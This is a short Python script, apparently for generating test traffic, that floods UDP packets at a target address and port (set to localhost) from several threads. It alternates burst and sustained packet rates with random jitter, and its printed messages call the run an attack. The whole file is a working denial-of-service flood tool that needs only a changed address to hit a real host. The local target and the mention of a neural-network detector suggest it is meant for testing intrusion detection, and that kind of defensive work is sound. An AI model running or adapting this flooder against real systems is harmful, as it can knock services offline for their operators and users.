import socket
import threading
import time
import random

TARGET_IP = "127.0.0.1"
TARGET_PORT = 5555

PACKET_SIZE = 1400
WINDOW_SECONDS = 2
ATTACK_DURATION = 25

BASE_PPS = 1800
BURST_PPS = 4200
THREADS = 5

payload = b"A" * PACKET_SIZE

def sender(rate, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    interval = 1.0 / rate
    while not stop_event.is_set():
        sock.sendto(payload, (TARGET_IP, TARGET_PORT))
        time.sleep(interval + random.uniform(-interval * 0.15, interval * 0.15))

def run_attack():
    print("[*] Starting LOCAL DNN-aligned ATTACK")

    stop = threading.Event()
    threads = []

    start = time.time()
    while time.time() - start < ATTACK_DURATION:
        elapsed = time.time() - start
        burst = int(elapsed / WINDOW_SECONDS) % 2 == 0

        pps = BURST_PPS if burst else BASE_PPS
        mode = "BURST" if burst else "SUSTAIN"
        print(f"[+] {mode} PPS={pps}")

        stop.set()
        for t in threads:
            t.join(timeout=0.1)

        stop.clear()
        threads.clear()

        for _ in range(THREADS):
            t = threading.Thread(
                target=sender,
                args=(pps // THREADS, stop),
                daemon=True
            )
            t.start()
            threads.append(t)

        time.sleep(WINDOW_SECONDS)

    stop.set()
    print("[+] Attack finished")

if __name__ == "__main__":
    run_attack()
